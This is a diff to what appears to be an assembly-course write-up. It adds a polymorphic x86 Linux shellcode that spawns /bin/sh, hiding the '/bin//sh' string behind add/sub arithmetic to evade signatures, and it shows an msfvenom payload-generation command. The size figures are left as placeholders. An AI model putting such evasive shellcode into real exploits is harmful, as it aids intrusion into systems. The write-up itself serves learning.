@@ -92,6 +92,33 @@ $
 
 ```
 
+The polymorphic version based on the original shellcode is ?? bytes long, which equates to ?% increase in size from the reference:
+
+```nasm
+global _start           
+
+section .text
+
+_start:
+    xor edx, edx    
+    push edx
+    mov eax, 0x563ED8B7
+    add eax, 0x12345678
+    push eax
+    mov eax, 0xDEADC0DE
+    sub eax, 0x70445EAF
+    push eax
+    push byte 0xb
+    pop eax
+    mov ecx, edx
+    mov ebx, esp
+    push byte 0x1
+    pop esi
+    int 0x80
+    xchg esi, eax
+    int 0x80
+```
+
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/exec CMD=/bin/sh --arch x86 --platform linux -f c
 No encoder or badchars specified, outputting raw payload
